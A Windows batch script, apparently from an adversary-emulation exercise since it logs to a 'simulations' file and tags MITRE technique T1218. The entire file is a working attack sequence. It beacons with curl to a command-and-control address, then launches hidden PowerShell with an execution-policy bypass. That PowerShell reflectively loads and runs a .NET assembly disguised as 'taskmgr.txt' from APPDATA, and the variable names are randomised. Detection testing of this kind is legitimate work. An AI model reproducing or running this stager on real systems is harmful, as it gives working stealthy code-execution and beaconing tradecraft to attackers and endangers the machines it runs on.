@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8383\af2bdd3f
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8383-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=taskmgr.txt
SET ewjmdkff=8383

REM Internal variables for logging
SET zxcvbn=%APPDATA%\!pudaazx!\macula-simulations.log
SET qwerty=%APPDATA%\!pudaazx!
SET asdfgh=powershell.exe

REM Debug: Script start
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: script_start>> "!zxcvbn!" 2>nul

REM 1. C2 Heartbeat
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_start>> "!zxcvbn!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: heartbeat_complete>> "!zxcvbn!" 2>nul

REM 2. Change directory
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>> "!zxcvbn!" 2>nul
cd /d "!pjkcpgw!"
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: chdir_complete>> "!zxcvbn!" 2>nul

REM 3. Execute .NET DLL via PowerShell
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: dll_exec_start=!syjfr!>> "!zxcvbn!" 2>nul
SET RESULT=0
SET ERR_DETAIL=
!asdfgh! -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!syjfr!')).EntryPoint.Invoke($null, @(,[string[]]@())) }"
IF !ERRORLEVEL! EQU 0 (
    SET RESULT=1
    SET ERR_DETAIL=
) ELSE (
    SET ERR_DETAIL=error_!ERRORLEVEL!
)
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: dll_exec_complete=!RESULT!>> "!zxcvbn!" 2>nul

REM TTP logging for T1218
SET DATE_NOW=%DATE%
SET TIME_NOW=%TIME%
echo [!DATE_NOW! !TIME_NOW!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!>> "!zxcvbn!" 2>nul

REM Debug: Script end
echo [%DATE% %TIME%][DEBUG][!hlbnp!]: script_end>> "!zxcvbn!" 2>nul

ENDLOCAL